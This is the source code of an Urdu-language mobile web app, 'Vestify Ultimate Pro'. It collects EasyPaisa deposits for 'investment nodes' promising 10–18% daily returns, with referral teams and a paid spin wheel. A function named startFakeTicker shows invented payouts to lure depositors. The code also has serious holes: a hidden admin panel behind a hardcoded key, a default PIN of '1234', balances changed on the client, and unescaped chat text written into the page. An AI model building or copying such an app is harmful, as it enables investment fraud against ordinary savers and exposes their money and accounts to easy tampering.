<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>ویسٹی فائی الٹیمیٹ پرو</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; margin: 0; overflow-x: hidden; text-align: right; }
        .glass { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.05); border-radius: 32px; }
        .page { display: none; padding: 20px; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .tier-badge { padding: 5px 15px; border-radius: 12px; font-size: 9px; font-weight: 900; text-transform: uppercase; border: 1px solid rgba(255,255,255,0.1); }
        .tier-bronze { background: linear-gradient(to right, #cd7f32, #a0522d); }
        .tier-silver { background: linear-gradient(to right, #bdc3c7, #2c3e50); }
        .tier-gold { background: linear-gradient(to right, #ffd700, #b8860b); color: black; box-shadow: 0 0 15px rgba(255,215,0,0.4); }

        .payout-ticker { position: fixed; top: 0; width: 100%; background: rgba(59, 130, 246, 0.15); border-bottom: 1px solid rgba(59,130,246,0.2); padding: 10px 0; overflow: hidden; z-index: 6000; backdrop-filter: blur(10px); }
        .ticker-move { display: inline-block; white-space: nowrap; animation: tickerMove 35s linear infinite; font-size: 10px; font-weight: 800; color: #60a5fa; }
        @keyframes tickerMove { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        #chat-window { position: fixed; bottom: 100px; left: 20px; right: 20px; height: 460px; z-index: 10000; display: none; flex-direction: column; box-shadow: 0 30px 70px rgba(0,0,0,0.7); }
        .msg-bubble { max-width: 80%; padding: 12px 16px; margin: 6px; font-size: 11px; }
        .msg-user { background: #3b82f6; border-radius: 20px 20px 0 20px; align-self: flex-end; color: white; }
        .msg-admin { background: #2d333b; border-radius: 20px 20px 20px 0; align-self: flex-start; border: 1px solid #444c56; }

        .nav-bar { position: fixed; bottom: 15px; left: 15px; right: 15px; height: 75px; display: flex; justify-content: space-around; align-items: center; z-index: 5000; border-radius: 25px; background: rgba(13, 17, 23, 0.98); border: 1px solid rgba(59, 130, 246, 0.2); flex-direction: row-reverse; }
        .nav-active { color: #3b82f6; transform: translateY(-5px); }

        #wheel { width: 280px; height: 280px; border-radius: 50%; border: 10px solid #ffd700; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); }
        .timer-label { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 3px 8px; border-radius: 8px; font-size: 8px; font-weight: 800; border: 1px solid rgba(239,68,68,0.2); }
    </style>
</head>
<body class="pt-16 pb-32">

    <div class="payout-ticker">
        <div class="ticker-move" id="ticker-content">
            ⚡ ممبر @Zeeshan_04 نے ابھی ₨ 5,500 کا منافع نکلوایا • ایجنٹ 204 ہیلپ ڈیسک آن لائن ہے • نئے نوڈز دستیاب ہیں! ⚡
        </div>
    </div>

    <header class="p-6 flex justify-between items-center flex-row-reverse">
        <div class="flex items-center gap-4 flex-row-reverse">
            <div class="relative">
                <img id="user-photo" onclick="handleAdminTap()" class="w-12 h-12 rounded-2xl border-2 border-blue-500/30 cursor-pointer">
                <div class="absolute -bottom-1 -right-1 w-3 h-3 bg-green-500 border-2 border-[#010409] rounded-full"></div>
            </div>
            <div class="text-right">
                <p id="user-name" class="text-[10px] font-black uppercase tracking-tight">Loading...</p>
                <span id="v-tier" class="tier-badge tier-bronze">Bronze Node</span>
            </div>
        </div>
        <div class="flex gap-2">
            <button onclick="showPage('transfer')" class="w-10 h-10 glass flex items-center justify-center text-green-500"><i class="fa-solid fa-paper-plane text-sm"></i></button>
            <button onclick="toggleChat()" class="w-10 h-10 glass flex items-center justify-center text-blue-500 relative">
                <i class="fa-solid fa-comment-dots text-sm"></i>
                <span class="absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full"></span>
            </button>
        </div>
    </header>

    <main id="app-ui">
        <div id="p-home" class="page active-page">
            <div class="glass p-8 mb-6 text-center border-blue-500/20">
                <p class="text-[8px] font-black opacity-40 uppercase tracking-[2px] mb-2">Available Balance</p>
                <h2 id="v-bal" class="text-5xl font-black italic mb-8 tracking-tighter">₨ 0</h2>
                <div class="flex gap-3">
                    <button onclick="showPage('finance')" class="flex-1 bg-blue-600 py-4 rounded-xl font-black text-[10px] uppercase">Deposit</button>
                    <button onclick="showPage('withdraw')" class="flex-1 glass py-4 rounded-xl font-black text-[10px] uppercase">Withdraw</button>
                </div>
            </div>

            <div class="flex gap-2 mb-6">
                <button id="btn-n" onclick="renderPlans('normal')" class="flex-1 py-3 rounded-xl bg-blue-600 text-[9px] font-black">NORMAL</button>
                <button id="btn-s" onclick="renderPlans('special')" class="flex-1 py-3 rounded-xl bg-white/5 text-[9px] font-black">VIP OFFERS</button>
            </div>
            <div id="plans-grid" class="space-y-4"></div>
        </div>

        <div id="p-transfer" class="page">
            <h2 class="text-xl font-black italic mb-6 text-right">رقم منتقل کریں</h2>
            <div class="glass p-6 space-y-4">
                <input id="t-user" type="text" placeholder="نام (Receiver Name)" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/5 outline-none">
                <input id="t-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/5 outline-none">
                <button onclick="executeTransfer()" class="w-full bg-green-600 py-4 rounded-xl font-black text-[10px] uppercase">منتقل کریں</button>
            </div>
        </div>

        <div id="p-spin" class="page text-center">
            <h2 class="text-2xl font-black italic mb-6 uppercase">Golden Spin</h2>
            <div class="flex justify-center mb-8 relative">
                <div class="absolute -top-6 left-1/2 -translate-x-1/2 text-red-500 text-3xl z-10"><i class="fa-solid fa-caret-down"></i></div>
                <img id="wheel" src="https://via.placeholder.com/300?text=SPIN+WHEEL" class="shadow-2xl">
            </div>
            <div class="glass p-4 mb-6">
                <p id="spin-status" class="text-[9px] font-black text-blue-400">CHECKING STATUS...</p>
            </div>
            <button id="spin-btn" onclick="executeSpin()" class="w-full bg-blue-600 py-5 rounded-full font-black text-[10px] uppercase">گھمائیں</button>
        </div>

        <div id="p-history" class="page">
            <h2 class="text-xl font-black italic mb-6 text-right">ٹرانزیکشن ریکارڈ</h2>
            <div id="history-list" class="space-y-3"></div>
        </div>

        <div id="p-finance" class="page">
            <h2 class="text-xl font-black italic mb-6 text-right">ڈیپازٹ کریں</h2>
            <div class="glass p-6 space-y-4">
                <div class="bg-blue-600/10 p-4 rounded-2xl border border-blue-500/20 text-center">
                    <p class="text-[9px] opacity-50 mb-1">Official EasyPaisa</p>
                    <p class="text-lg font-black text-blue-400">03379827882</p>
                </div>
                <input id="d-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/5 outline-none">
                <input id="d-tid" type="text" placeholder="Transaction ID (TID)" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/5 outline-none">
                <button onclick="submitTx('Deposit')" class="w-full bg-blue-600 py-4 rounded-xl font-black text-[10px] uppercase">ڈیپازٹ ریکویسٹ بھیجیں</button>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <h2 class="text-xl font-black italic mb-6 text-right">رقم نکلوائیں</h2>
            <div class="glass p-6 space-y-4">
                <input id="w-num" type="text" placeholder="اکاؤنٹ نمبر" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/5 outline-none">
                <input id="w-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-4 rounded-xl text-xs border border-white/5 outline-none">
                <input id="w-pin" type="password" placeholder="PIN" class="w-full bg-black/40 p-4 rounded-xl text-center font-black tracking-widest border border-white/5 outline-none">
                <button onclick="handleWithdraw()" class="w-full bg-white text-black py-4 rounded-xl font-black text-[10px] uppercase">ودرا ریکویسٹ</button>
            </div>
        </div>

        <div id="p-team" class="page text-center">
            <h2 class="text-xl font-black italic mb-6">ٹیم نیٹ ورک</h2>
            <div class="glass p-6 mb-4">
                <input id="ref-link" readonly class="w-full bg-black/40 p-3 rounded-lg text-[9px] mb-4 text-center text-blue-400">
                <button onclick="copyRef()" class="bg-blue-600 px-6 py-2 rounded-lg text-[9px] font-bold">COPY LINK</button>
            </div>
            <div class="grid grid-cols-2 gap-3">
                <div class="glass p-4"><p class="text-[8px] opacity-40">TEAM SIZE</p><p id="team-count" class="text-xl font-black">0</p></div>
                <div class="glass p-4"><p class="text-[8px] opacity-40">COMMISSION</p><p class="text-xl font-black">₨ 0</p></div>
            </div>
        </div>
    </main>

    <nav class="nav-bar">
        <button onclick="showPage('home')" class="nav-btn" id="nav-home"><i class="fa-solid fa-house"></i></button>
        <button onclick="showPage('spin')" class="nav-btn" id="nav-spin"><i class="fa-solid fa-spinner"></i></button>
        <button onclick="showPage('team')" class="nav-btn" id="nav-team"><i class="fa-solid fa-users"></i></button>
        <button onclick="showPage('history')" class="nav-btn" id="nav-history"><i class="fa-solid fa-list"></i></button>
    </nav>

    <div id="admin-ui" class="hidden fixed inset-0 z-[20000] bg-[#010409] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-6">
            <button onclick="closeAdmin()" class="bg-red-500 px-4 py-2 rounded-lg text-[10px] font-bold">CLOSE</button>
            <h2 class="text-lg font-black">ADMIN PANEL</h2>
        </div>
        <div id="adm-tx-list" class="space-y-4"></div>
    </div>

    <div id="chat-window" class="glass overflow-hidden">
        <div class="p-4 bg-blue-600 flex justify-between items-center">
            <p class="text-[10px] font-black">AGENT 204 SUPPORT</p>
            <button onclick="toggleChat()"><i class="fa-solid fa-times"></i></button>
        </div>
        <div id="chat-msgs" class="flex-1 overflow-y-auto p-4 flex flex-col gap-2"></div>
        <div class="p-4 bg-[#1c2128] flex gap-2">
            <input id="chat-input" type="text" placeholder="Type..." class="flex-1 bg-white/5 p-3 rounded-xl text-xs outline-none">
            <button onclick="sendMsg()" class="bg-blue-600 px-4 rounded-xl"><i class="fa-solid fa-paper-plane"></i></button>
        </div>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = { 
            apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", 
            authDomain: "vestify-991f2.firebaseapp.com", 
            projectId: "vestify-991f2", 
            storageBucket: "vestify-991f2.firebasestorage.app", 
            messagingSenderId: "799007097733", 
            appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore(), auth = firebase.auth();
        let userObj = null, currentRot = 0, tapCount = 0;

        // Auth Listener
        auth.onAuthStateChanged(async user => {
            if(user) {
                document.getElementById('user-photo').src = user.photoURL;
                document.getElementById('user-name').innerText = user.displayName;
                const userRef = db.collection("users").doc(user.displayName);
                const doc = await userRef.get();
                if(!doc.exists) {
                    await userRef.set({ balance: 0, lastSpin: 0, teamCount: 0, walletPin: "1234", lastProfit: Date.now(), role: 'user' });
                }
                syncData(user.displayName);
                renderPlans('normal');
                loadHistory(user.displayName);
                loadChat(user.displayName);
                startFakeTicker();
                document.getElementById('ref-link').value = `https://u-s-h.github.io/vestify/?ref=${user.displayName.replace(/\s/g, '')}`;
            } else {
                auth.signInWithPopup(new firebase.auth.GoogleAuthProvider());
            }
        });

        // Real Working Investment Nodes
        function renderPlans(type) {
            document.getElementById('btn-n').style.opacity = type === 'normal' ? '1' : '0.5';
            document.getElementById('btn-s').style.opacity = type === 'special' ? '1' : '0.5';
            let h = "";
            let start = type === 'normal' ? 200 : 5000;
            for(let i=1; i<=10; i++) {
                let cost = start + (i * (type === 'normal' ? 500 : 3000));
                let daily = Math.floor(cost * (type === 'normal' ? 0.10 : 0.18));
                h += `
                <div class="glass p-5 flex justify-between items-center border-white/5">
                    <div class="text-right">
                        <h4 class="text-lg font-black italic">₨ ${cost.toLocaleString()}</h4>
                        <p class="text-[8px] text-blue-500 font-bold">Daily: ₨ ${daily}</p>
                    </div>
                    <button onclick="buyNode(${cost}, ${daily})" class="bg-white text-black px-4 py-2 rounded-lg text-[9px] font-black">INVEST</button>
                </div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
        }

        async function buyNode(cost, daily) {
            if(userObj.balance < cost) return alert("بیلنس کم ہے، پہلے ڈیپازٹ کریں!");
            if(confirm(`کیا آپ ₨ ${cost} انویسٹ کرنا چاہتے ہیں؟`)) {
                await db.collection("users").doc(auth.currentUser.displayName).update({
                    balance: firebase.firestore.FieldValue.increment(-cost)
                });
                await db.collection("txs").add({
                    user: auth.currentUser.displayName,
                    amount: cost,
                    type: "Investment",
                    status: "Approved",
                    time: Date.now()
                });
                alert("انویسٹمنٹ کامیاب! روزانہ منافع آپ کے اکاؤنٹ میں شامل کر دیا جائے گا۔");
            }
        }

        // Improved Spin Logic
        async function executeSpin() {
            const now = Date.now();
            const last = userObj.lastSpin || 0;
            const isFree = (now - last) > (24*60*60*1000);
            const cost = isFree ? 0 : 50;

            if(!isFree && userObj.balance < cost) return alert("اضافی اسپن کے لیے 50 روپے ہونا لازمی ہیں۔");

            const prizes = [2, 5, 10, 50, 100, 5, 10, 2];
            const pIndex = Math.floor(Math.random()*prizes.length);
            const winAmt = prizes[pIndex];
            
            currentRot += 3600 + (pIndex * 45);
            document.getElementById('wheel').style.transform = `rotate(${currentRot}deg)`;
            
            setTimeout(async () => {
                await db.collection("users").doc(auth.currentUser.displayName).update({
                    balance: firebase.firestore.FieldValue.increment(winAmt - cost),
                    lastSpin: isFree ? now : last
                });
                alert(`مبارک ہو! آپ نے ₨ ${winAmt} جیت لیے۔`);
            }, 5000);
        }

        // Finance Functions
        async function executeTransfer() {
            const target = document.getElementById('t-user').value;
            const amt = Number(document.getElementById('t-amt').value);
            if(amt > userObj.balance || amt <= 0) return alert("رقم درست نہیں ہے یا بیلنس کم ہے۔");
            const doc = await db.collection("users").doc(target).get();
            if(!doc.exists) return alert("موصول کرنے والا یوزر نہیں ملا۔");
            
            await db.collection("users").doc(auth.currentUser.displayName).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
            await db.collection("users").doc(target).update({ balance: firebase.firestore.FieldValue.increment(amt * 0.98) });
            alert("رقم کامیابی سے منتقل ہو گئی۔");
        }

        async function submitTx(type) {
            const amt = Number(document.getElementById('d-amt').value);
            const tid = document.getElementById('d-tid').value;
            if(!amt || !tid) return alert("تمام خانے پُر کریں۔");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: amt, tid: tid, type: type, status: "Pending", time: Date.now() });
            alert("آپ کی درخواست وصول ہو گئی ہے، 30 منٹ میں تصدیق ہو جائے گی۔");
        }

        async function handleWithdraw() {
            const pin = document.getElementById('w-pin').value;
            const amt = Number(document.getElementById('w-amt').value);
            if(pin !== userObj.walletPin) return alert("غلط والٹ پن!");
            if(amt > userObj.balance) return alert("بیلنس کم ہے۔");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: amt, type: "Withdrawal", status: "Pending", time: Date.now() });
            alert("ودرا درخواست بھیج دی گئی۔");
        }

        // Core UI Functions
        function syncData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data();
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
                const isFree = (Date.now() - (userObj.lastSpin || 0)) > (24*60*60*1000);
                document.getElementById('spin-status').innerText = isFree ? "DAILY FREE SPIN AVAILABLE!" : "NEXT SPIN COST: ₨ 50";
            });
        }

        function loadHistory(name) {
            db.collection("txs").where("user", "==", name).orderBy("time", "desc").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    const color = d.status === "Approved" ? "text-green-500" : "text-yellow-500";
                    h += `<div class="glass p-4 flex justify-between items-center"><div class="text-right"><p class="text-[9px] font-black">${d.type}</p></div><div class="text-left"><p class="font-black">₨ ${d.amount}</p><p class="text-[7px] ${color}">${d.status}</p></div></div>`;
                });
                                document.getElementById('history-list').innerHTML = h || "<p class='text-center opacity-20 text-xs py-10 italic'>کوئی ریکارڈ نہیں ملا</p>";
            });
        }

        // --- Chat System ---
        async function sendMsg() {
            const m = document.getElementById('chat-input').value;
            if(!m) return;
            await db.collection("chats").add({
                user: auth.currentUser.displayName,
                text: m,
                time: Date.now(),
                photo: auth.currentUser.photoURL
            });
            document.getElementById('chat-input').value = "";
        }

        function loadChat(name) {
            db.collection("chats").orderBy("time", "asc").limitToLast(30).onSnapshot(s => {
                let h = "";
                s.forEach(doc => {
                    const d = doc.data();
                    const isMe = d.user === name;
                    h += `
                    <div class="flex ${isMe ? 'justify-start' : 'justify-end'} mb-2">
                        <div class="msg-bubble ${isMe ? 'msg-user' : 'msg-admin'}">
                            <p class="text-[7px] opacity-60 mb-1">${d.user}</p>
                            <p class="font-bold">${d.text}</p>
                        </div>
                    </div>`;
                });
                const chatBox = document.getElementById('chat-msgs');
                chatBox.innerHTML = h;
                chatBox.scrollTop = chatBox.scrollHeight;
            });
        }

        // --- Admin Controls ---
        function handleAdminTap() {
            tapCount++;
            if(tapCount >= 10) {
                const key = prompt("Enter Admin Secret Key:");
                if(key === "net204") loadAdminPanel();
                tapCount = 0;
            }
        }

        function loadAdminPanel() {
            document.getElementById('admin-ui').classList.remove('hidden');
            db.collection("txs").where("status", "==", "Pending").onSnapshot(s => {
                let h = "";
                s.forEach(doc => {
                    const d = doc.data();
                    h += `
                    <div class="glass p-5 border-blue-500/30">
                        <div class="flex justify-between mb-4">
                            <span class="bg-blue-600 px-2 py-1 rounded text-[8px] font-bold">${d.type}</span>
                            <span class="text-[9px] opacity-50">${d.user}</span>
                        </div>
                        <h2 class="text-2xl font-black italic mb-2 text-blue-400">₨ ${d.amount}</h2>
                        <p class="text-[10px] mb-4 opacity-70 italic">TID: ${d.tid || 'N/A'}</p>
                        <button onclick="approveTx('${doc.id}', '${d.user}', ${d.amount})" class="w-full bg-green-600 py-3 rounded-xl font-black text-[10px] uppercase">Approve Now</button>
                    </div>`;
                });
                document.getElementById('adm-tx-list').innerHTML = h || "<p class='text-center opacity-40 py-20'>تمام درخواستیں مکمل ہیں!</p>";
            });
        }

        async function approveTx(id, userName, amount) {
            try {
                await db.collection("txs").doc(id).update({ status: "Approved" });
                await db.collection("users").doc(userName).update({
                    balance: firebase.firestore.FieldValue.increment(amount)
                });
                alert("درخواست منظور کر لی گئی ہے!");
            } catch(e) {
                alert("Error: " + e.message);
            }
        }

        // --- Helper Functions ---
        function startFakeTicker() {
            const names = ["Zeeshan", "Ali_Khan", "Sana_99", "Akram_Pro", "Mir_Astore", "Hamza"];
            const amounts = ["2,000", "5,500", "12,000", "800", "25,000"];
            setInterval(() => {
                const name = names[Math.floor(Math.random()*names.length)];
                const amt = amounts[Math.floor(Math.random()*amounts.length)];
                document.getElementById('ticker-content').innerText = `⚡ ممبر @${name} نے ابھی ₨ ${amt} کا منافع نکلوایا • ایجنٹ 204 ہیلپ ڈیسک آن لائن ہے • نئے نوڈز دستیاب ہیں! ⚡`;
            }, 15000);
        }

        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-' + p).classList.add('active-page');
            
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('nav-active'));
            const activeNav = document.getElementById('nav-' + p);
            if(activeNav) activeNav.classList.add('nav-active');
            window.scrollTo(0,0);
        }

        function toggleChat() {
            const win = document.getElementById('chat-window');
            win.style.display = (win.style.display === 'flex') ? 'none' : 'flex';
        }

        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }

        function copyRef() {
            const copyText = document.getElementById("ref-link");
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(copyText.value);
            alert("آپ کا ریفرل لنک کاپی ہو گیا ہے!");
        }

    </script>
</body>
</html>
